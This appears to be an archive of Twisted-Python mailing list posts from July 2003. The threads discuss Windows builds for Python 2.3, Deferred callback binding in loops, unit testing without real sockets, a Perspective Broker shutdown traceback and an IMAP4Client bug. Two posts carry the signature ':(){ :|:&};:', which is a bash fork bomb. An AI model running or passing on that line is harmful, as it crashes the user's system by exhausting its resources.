Cory Dodt <corydodt at yahoo.com> writes:

>>Subject: [Twisted-Python] Twisted - Python 2.3 - Windows
>>
>>Hi,
>>
>> anyone who knows when the first Python 2.3 build of twisted for
>> windows will be available? Which version will it be?
>>
>> I tried to build it myself but got into trouble. I first installed
>> Cygwin and then tried 'setup.py build --compiler=mingw32' as per
>> documentation, but I got an error message that Python itself is
>> build with Visual Studio 6.
>>I don't feel building python myself and I don't have VS6.
>>
>
> I'm with you man,  I don't feel like building Python myself either.  I
> have asked the appropriate list
> (http://mail.python.org/pipermail/distutils-sig/2003-July/003333.html )
> about this problem.  I also tried using distutils from CVS instead of
> the bundled copy with Python 2.3, and no luck.
>
> There won't be an official Python 2.3 build of Twisted for Windows
> until this is resolved, as I don't have MSVC and don't intend to buy a
> copy.  mingw should work.
>
> In the meantime, you should know that you can get by without the
> extensions.  Just do
> $ python setup.py install  --skip-build
>
> You won't get cbanana or _c_urlarg, the only extensions built for windows.

If anyoe wants it, I've just built twisted-1.0.7alpha-2 with MSVC6 for
Python 2.3. Just tell me where it should be uploaded.
I can do the same for 1.0.6.

Thomas




From justinjohnson at fastmail.fm  Thu Jul 31 11:13:28 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Thu, 31 Jul 2003 11:13:28 -0600
Subject: [Twisted-Python] Callbacks, Looping, and Variable Binding
Message-ID: <20030731171328.BAF3F389C1@www.fastmail.fm>

When I run the following code, everytime the callbacks to "onSuccess" get
called, "item" is bound to the last element in "list".  Obviously what I
want is to have "item" bound to the value it had when I added the
callback.  How does one handle looping constructs like this in Twisted?


def someFunc():
    deferreds = []

    def onSuccess(results):
       d = item.doSomethingElseThatReturnsDeferred()
       return d

    d = doSomethingThatReturnsDeferred()

    for item in list:
        d.addCallbacks(onSuccess, log.err)
        deferreds.append(d)

    return defer.DefferedList(deferreds)



From pje at telecommunity.com  Thu Jul 31 11:41:53 2003
From: pje at telecommunity.com (Phillip J. Eby)
Date: Thu, 31 Jul 2003 13:41:53 -0400
Subject: [Twisted-Python] Re: Twisted - Python 2.3 - Windows
In-Reply-To: <zniuvd74.fsf@python.net>
References: <20030731114303.19165.89412.Mailman@pyramid.twistedmatrix.com>
 <3F294288.4000009@yahoo.com>
Message-ID: <5.1.1.6.0.20030731133337.01dc7020@telecommunity.com>

At 07:05 PM 7/31/03 +0200, Thomas Heller wrote:
>Cory Dodt <corydodt at yahoo.com> writes:
>
> >>Subject: [Twisted-Python] Twisted - Python 2.3 - Windows
> >>
> >>Hi,
> >>
> >> anyone who knows when the first Python 2.3 build of twisted for
> >> windows will be available? Which version will it be?
> >>
> >> I tried to build it myself but got into trouble. I first installed
> >> Cygwin and then tried 'setup.py build --compiler=mingw32' as per
> >> documentation, but I got an error message that Python itself is
> >> build with Visual Studio 6.
> >>I don't feel building python myself and I don't have VS6.
> >>
> >
> > I'm with you man,  I don't feel like building Python myself either.  I
> > have asked the appropriate list
> > (http://mail.python.org/pipermail/distutils-sig/2003-July/003333.html )
> > about this problem.  I also tried using distutils from CVS instead of
> > the bundled copy with Python 2.3, and no luck.

It looks like the error occurs when an MSVCCompiler instance is created; I 
haven't yet figured out *why* such an instance is being created.  I don't 
have 2.3 installed on Win32, so as an experiment, I added a 'raise' 
statement to 2.2's MSVCCompiler.  If I specified compilation with msvc, I 
get the error I raised.  If I specify mingw32, I don't.  So, evidently 
2.2's distutils don't create an MSVCCompiler instance when specifying 
mingw32.  I can't fathom why 2.3 would do so.




From corydodt at yahoo.com  Thu Jul 31 13:09:31 2003
From: corydodt at yahoo.com (Cory Dodt)
Date: Thu, 31 Jul 2003 12:09:31 -0700
Subject: solved Re: [Twisted-Python] Re: Twisted - Python 2.3 - Windows -
 mingw
In-Reply-To: <5.1.1.6.0.20030731133337.01dc7020@telecommunity.com>
References: <20030731114303.19165.89412.Mailman@pyramid.twistedmatrix.com> <3F294288.4000009@yahoo.com> <5.1.1.6.0.20030731133337.01dc7020@telecommunity.com>
Message-ID: <3F29696B.60808@yahoo.com>

Phillip J. Eby wrote:

>
> It looks like the error occurs when an MSVCCompiler instance is 
> created; I
> haven't yet figured out *why* such an instance is being created.  I don't
> have 2.3 installed on Win32, so as an experiment, I added a 'raise'
> statement to 2.2's MSVCCompiler.  If I specified compilation with msvc, I
> get the error I raised.  If I specify mingw32, I don't.  So, evidently
> 2.2's distutils don't create an MSVCCompiler instance when specifying
> mingw32.  I can't fathom why 2.3 would do so.

Well, I figured out why.  This was a bug in Twisted's setup.py, which 
has a function _check_header that is supposed to invoke the compiler on 
a tiny test module to make sure the module being built will build 
successfully.

The new compiler is constructed with new_compiler(), but no arguments 
were passed to it; it was this invocation that fails with the error 
message I was getting.  This bug was introduced some time ago; I'm not 
sure why I didn't see it before now.

Using self.compiler instead worked (there's no need to call 
new_compiler() when it's already been done for you).

C





From pb_twisted at olga.mine.nu  Thu Jul 31 13:49:17 2003
From: pb_twisted at olga.mine.nu (Patrik Blommaskog)
Date: Thu, 31 Jul 2003 21:49:17 +0200
Subject: [Twisted-Python] Providing perspective-dependent client-side information to a pb.RemoteCache object
Message-ID: <JAEDJDIBADCJHPFLNEDFMEKBCAAA.pb_twisted@olga.mine.nu>

Hmm, I find it hard to describe it as a short subject, but here's what I
seek to do:

On the server, I have the structure:

class A(pb.Cacheable):
    [...]

class B(pb.Cacheable):
    def __init__():
        self.stuff = A()	# This attribute gets replicated.


And on the client side, there are the corresponding pb.RemoteCache classes.

When an instance of B is replicated, a client-side A gets instantiated and
its setCopyableState is called, and the client-side B instance gets its
reference to it.

So far, so good.

But when the client-side A is created and its state has been set, I also
want to perform some other processing which requires references to other
parts of the client. I would prefer not to make these parts into globals.
For example, it could be dependent on the client-side perspective it
communicates through, which would be handy if the client connects to
multiple servers.

I'd like to know if there is an accepted idiom for supplying this? For
example, I believe it would have worked if the setCopyableState received the
perspective as a third parameter.





From tv at twistedmatrix.com  Thu Jul 31 13:43:55 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 31 Jul 2003 22:43:55 +0300
Subject: [Twisted-Python] the right way of unit testing protocols
In-Reply-To: <20030731110307.7639a494.itamar@itamarst.org>
References: <000001c356cc$3d768340$5591013d@thilakra> <20030730151039.02684534.itamar@itamarst.org> <20030731020900.GA30331@frobozz> <20030731110710.GA21641@lapdog> <20030731110307.7639a494.itamar@itamarst.org>
Message-ID: <20030731194355.GA32069@lapdog>

On Thu, Jul 31, 2003 at 11:03:07AM -0400, Itamar Shtull-Trauring wrote:
> > 	Opening TCP sockets in unit tests is just not _unit_ testing
> > 	in my book. Please don't do it in unit tests. It just makes it
> > 	harder to run your unit tests in varying environments. (Who
> > 	says I allow you to bind to port 1234? Who says it's free?
> > 	Who says I allow you to listen *at all*?)
> 
> Most of Twisted's unittests listen on 0 and then figure out which port
> was bound to. 

	Which is mostly the reason why I'm bitch about it on _this_
	mailing list.

	I dislike that method. I really do.

	There have been _months_ during which certain twisted unit
	tests randomly fail; many of those have been due to
	interaction with local TCP stack, networking, firewall and
	miscellanous experimental security features.

	I really think unit tests should touch the underlying
	libraries/OS as little as possible. For the cases where you
	really want to test the OS integration, you want to do things
	like stress tests, and for e.g. mail tests where you randomly
	shut down the power to a machine running a stress test, and
	later check that no messages were lost.

-- 
:(){ :|:&};:



From tv at twistedmatrix.com  Thu Jul 31 13:50:04 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Thu, 31 Jul 2003 22:50:04 +0300
Subject: [Twisted-Python] Callbacks, Looping, and Variable Binding
In-Reply-To: <20030731171328.BAF3F389C1@www.fastmail.fm>
References: <20030731171328.BAF3F389C1@www.fastmail.fm>
Message-ID: <20030731195004.GB32069@lapdog>

On Thu, Jul 31, 2003 at 11:13:28AM -0600, Justin Johnson wrote:
> When I run the following code, everytime the callbacks to "onSuccess" get
> called, "item" is bound to the last element in "list".  Obviously what I
> want is to have "item" bound to the value it had when I added the
> callback.  How does one handle looping constructs like this in Twisted?

	Then don't inherit the namespace of someFunc. You could even
	move onSuccess outside of someFunc, to make sure you don't do
	that by accident.

	Besides, you are adding the outer d to deferreds once per
	iteration. That's broken.

        What do you want? I don't know what you are trying to do, so
        here's a guess, in form of a similar example as your code:

> def someFunc():
>     deferreds = []
> 
>     def onSuccess(results):
>        d = item.doSomethingElseThatReturnsDeferred()
>        return d
> 
>     d = doSomethingThatReturnsDeferred()
> 
>     for item in list:
>         d.addCallbacks(onSuccess, log.err)
>         deferreds.append(d)
> 
>     return defer.DefferedList(deferreds)

def onSuccess(item):
    d = item.doSomethingElseThatReturnsDeferred()
    return d

def someFunc(listOfItems):
    deferreds = []

    for item in listOfItems:
        d = doSomethingThatReturnsDeferred(item)
        d.addCallbacks(onSuccess, log.err)
        deferreds.append(d)

    return defer.DeferredList(deferreds)

-- 
:(){ :|:&};:



From justinjohnson at fastmail.fm  Thu Jul 31 14:20:24 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Thu, 31 Jul 2003 14:20:24 -0600
Subject: [Twisted-Python] Callbacks, Looping, and Variable Binding
In-Reply-To: <20030731195004.GB32069@lapdog>
References: <20030731171328.BAF3F389C1@www.fastmail.fm> <20030731195004.GB32069@lapdog>
Message-ID: <20030731202024.3E44338FCB@www.fastmail.fm>

On Thu, 31 Jul 2003 22:50:04 +0300, "Tommi Virtanen"
<tv at twistedmatrix.com> said:
> On Thu, Jul 31, 2003 at 11:13:28AM -0600, Justin Johnson wrote:
> > When I run the following code, everytime the callbacks to "onSuccess" get
> > called, "item" is bound to the last element in "list".  Obviously what I
> > want is to have "item" bound to the value it had when I added the
> > callback.  How does one handle looping constructs like this in Twisted?
> 
> 	Then don't inherit the namespace of someFunc. You could even
> 	move onSuccess outside of someFunc, to make sure you don't do
> 	that by accident.

My problem (besides just having a lot to learn) was that I was writing
the callbacks to use variables that were defined in the loop, thinking I
had no other option besides using results passed by previous callbacks. 
The results that were returned from doSomethingThatReturnsDeferred (and
thus were arguments to the next callback) were needed (not right away,
but I wanted the results to continue being passed down the callback
chain), and I wasn't aware of any other way to get "item" passed to my
callback.  However, I tried using callbackArgs to pass "item" in a tuple,
like this...

     for item in list:
         d.addCallbacks(onSuccess, log.err, callbackArgs=(item,))
         deferreds.append(d)

and then defining onSuccess like...

    def onSuccess(results, args):
        item = args[0]
        d = item.doSomethingElseThatReturnsDeferred()
        return d

Is this an acceptable way to accomplish this?  It is working in my code
but I'd like to do things the right way.

> 
> 	Besides, you are adding the outer d to deferreds once per
> 	iteration. That's broken.

I'm not sure what you mean here.  I was adding my deferred to a list and
it seemed to be doing what I wanted (at least I think it was).

Your help is appreciated.
-Justin



From justinjohnson at fastmail.fm  Thu Jul 31 14:29:45 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Thu, 31 Jul 2003 14:29:45 -0600
Subject: [Twisted-Python] Callbacks, Looping, and Variable Binding
In-Reply-To: <20030731202024.3E44338FCB@www.fastmail.fm>
References: <20030731171328.BAF3F389C1@www.fastmail.fm> <20030731195004.GB32069@lapdog> <20030731202024.3E44338FCB@www.fastmail.fm>
Message-ID: <20030731202945.126C0378E6@www.fastmail.fm>

> > 
> > 	Besides, you are adding the outer d to deferreds once per
> > 	iteration. That's broken.
> 
> I'm not sure what you mean here.  I was adding my deferred to a list and
> it seemed to be doing what I wanted (at least I think it was).
> 

To clarify, what I'm trying to do here is create a bunch of Deferred's
that aren't dependent on each other, and then put them in a DeferredList
so I can add a callback to the list which will only fire when all
Deferred's in the list are done.  Does that make sense?



From mesozoic at polynode.com  Thu Jul 31 15:02:10 2003
From: mesozoic at polynode.com (Alex Levy)
Date: Thu, 31 Jul 2003 21:02:10 +0000
Subject: [Twisted-Python] Remote PB calls in ApplicationService.stopService
Message-ID: <20030731210210.GR282@perpetual.moxn.net>

I had two programs running; one was a twistd -y instance, the other was a
simple script that received objects over Perspective Broker and printed them
out.

The -y'able application consists of one Service:

 class MyService(app.ApplicationService):
   def somePBRemoteCall(self, event):
     d = pb.getObjectAt(self.host, self.port, self.timeout)
     d.addCallback(self.foundCatcher, event)
   def foundCatcher(self, obj, event):
     d = obj.callRemote('catch', event)
   def stopService(self):
     somePBRemoteCall(i_am_dying_event)
     app.ApplicationService.stopService(self)

This isn't the code verbatim, but this is basically what it's doing. I want
the receiving side to be informed when the sending side is about to stop.

On the sending side, this results in 'Connection failed'. On the receiving
side, the following traceback appears. Could somebody more familiar with the
internals of Perspective Broker explain what's going wrong, or how I might
change my approach?

---snip---
Traceback (most recent call last):
  File "sandbox/test-catcher.py", line 15, in ?
    reactor.run()
  File "/usr/lib/python2.2/site-packages/twisted/internet/default.py", line 122, in run
    self.mainLoop()
  File "/usr/lib/python2.2/site-packages/twisted/internet/default.py", line 133, in mainLoop
    self.doIteration(t)
  File "/usr/lib/python2.2/site-packages/twisted/internet/default.py", line 472, in doSelect
    _logrun(selectable, _drdw, selectable, method, dict)
    --- <exception caught here> ---
  File "/usr/lib/python2.2/site-packages/twisted/python/log.py", line 65, in callWithLogger
    callWithContext({"system": lp}, func, *args, **kw)
  File "/usr/lib/python2.2/site-packages/twisted/python/log.py", line 52, in callWithContext
    return context.call({ILogContext: newCtx}, func, *args, **kw)
  File "/usr/lib/python2.2/site-packages/twisted/python/context.py", line 32, in callWithContext
    return func(*args,**kw)
  File "/usr/lib/python2.2/site-packages/twisted/internet/default.py", line 495, in _doReadOrWrite
    selectable.connectionLost(f)
  File "/usr/lib/python2.2/site-packages/twisted/internet/tcp.py", line 253, in connectionLost
    protocol.connectionLost(reason)
  File "/usr/lib/python2.2/site-packages/twisted/spread/pb.py", line 563, in connectionLost
    for lobj in self.remotelyCachedObjects.values():
exceptions.AttributeError: Broker instance has no attribute 'remotelyCachedObjects'
---snip---

-- 
Alex Levy
WWW: http://mesozoic.geecs.org
 
"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From andrew-twisted at puzzling.org  Thu Jul 31 19:21:30 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Fri, 1 Aug 2003 11:21:30 +1000
Subject: [Twisted-Python] the right way of unit testing protocols
In-Reply-To: <20030731194355.GA32069@lapdog>
References: <000001c356cc$3d768340$5591013d@thilakra> <20030730151039.02684534.itamar@itamarst.org> <20030731020900.GA30331@frobozz> <20030731110710.GA21641@lapdog> <20030731110307.7639a494.itamar@itamarst.org> <20030731194355.GA32069@lapdog>
Message-ID: <20030801012130.GA32720@frobozz>

On Thu, Jul 31, 2003 at 10:43:55PM +0300, Tommi Virtanen wrote:
> On Thu, Jul 31, 2003 at 11:03:07AM -0400, Itamar Shtull-Trauring wrote:
> > > 	Opening TCP sockets in unit tests is just not _unit_ testing
> > > 	in my book. Please don't do it in unit tests. It just makes it
> > > 	harder to run your unit tests in varying environments. (Who
> > > 	says I allow you to bind to port 1234? Who says it's free?
> > > 	Who says I allow you to listen *at all*?)
> > 
> > Most of Twisted's unittests listen on 0 and then figure out which port
> > was bound to. 
> 
> 	Which is mostly the reason why I'm bitch about it on _this_
> 	mailing list.
> 
> 	I dislike that method. I really do.
> 
> 	There have been _months_ during which certain twisted unit
> 	tests randomly fail; many of those have been due to
> 	interaction with local TCP stack, networking, firewall and
> 	miscellanous experimental security features.

I've *never* seen a failure due to listening on 0, either on my own
machines, or on the buildslaves, or reports on this list or IRC.  I'd be
inclined to agree with you if there was actually some evidence of a problem.

I *have* seen failures due to assuming that a *particular* port is
available, and that's definitely a no-no, because it could legitimately be
in use (especially if someone else is running tests on the same machine! :).
That's why none of the Twisted unit tests do this anymore.  Listening on 0
(as our TCP tests do, and as twisted.protocols.loopback.loopbackTCP does)
asks the OS to use any available port it likes, and I've never seen it fail.

-Andrew.




From jgoerzen at complete.org  Thu Jul 31 19:47:11 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Thu, 31 Jul 2003 20:47:11 -0500
Subject: [Twisted-Python] Flag storing broke in IMAP4Client
Message-ID: <20030801014711.GA21619@complete.org>

Hello,

I have discovered what I believe to be a bug in IMAP4Client in the file
imap4.py.  I received the following traceback:

Traceback (most recent call last):
  File "/usr/lib/python2.2/site-packages/twisted/protocols/imap4.py", line 1136, in _defaultHandler
    cmd.finish(rest, self._extraInfo)
  File "/usr/lib/python2.2/site-packages/twisted/protocols/imap4.py", line 146, in finish
    self.defer.callback((send, lastLine))
  File "/usr/lib/python2.2/site-packages/twisted/internet/defer.py", line 218, in callback
    self._startRunCallbacks(result)
  File "/usr/lib/python2.2/site-packages/twisted/internet/defer.py", line 274, in _startRunCallbacks
    self._runCallbacks()
--- <exception caught here> ---
  File "/usr/lib/python2.2/site-packages/twisted/internet/defer.py", line 288, in _runCallbacks
    self.result = callback(self.result, *args, **kw)
exceptions.TypeError: __cbFetch() got an unexpected keyword argument 'lookFor'

In fact, imap4.py contains:

    def _store(self, messages, cmd, flags, uid):
        store = uid and 'UID STORE' or 'STORE'
        args = ' '.join((messages, cmd, '(%s)' % ' '.join(flags)))
        d = self.sendCommand(Command(store, args, wantResponse=('FETCH',)))
        d.addCallback(self.__cbFetch, lookFor='FLAGS')
        return d

In fact, __cbFetch is defined as:

    def __cbFetch(self, (lines, last)):

No lookfor parameter.

This is with Twisted 1.0.6.

This would likely be a problem for all IMAP commands that issues STORE to the
server: setFlags(), addFlags(), removeFlags(), etc.

-- John



From andrew-twisted at puzzling.org  Thu Jul 31 20:00:39 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Fri, 1 Aug 2003 12:00:39 +1000
Subject: [Twisted-Python] Flag storing broke in IMAP4Client
In-Reply-To: <20030801014711.GA21619@complete.org>
References: <20030801014711.GA21619@complete.org>
Message-ID: <20030801020039.GB32720@frobozz>

On Thu, Jul 31, 2003 at 08:47:11PM -0500, John Goerzen wrote:
> Hello,
> 
> I have discovered what I believe to be a bug in IMAP4Client in the file
> imap4.py.  I received the following traceback:
[...]
> This is with Twisted 1.0.6.
> 
> This would likely be a problem for all IMAP commands that issues STORE to the
> server: setFlags(), addFlags(), removeFlags(), etc.

I *strongly* recommend using either CVS or the latest alpha if you are using
IMAP.  There has been a lot of work (almost forty checkins) done on it since
1.0.6:
    http://twistedmatrix.com/users/jh.twistd/viewcvs/cgi/viewcvs.cgi/twisted/protocols/imap4.py?cvsroot=Twisted

-Andrew.




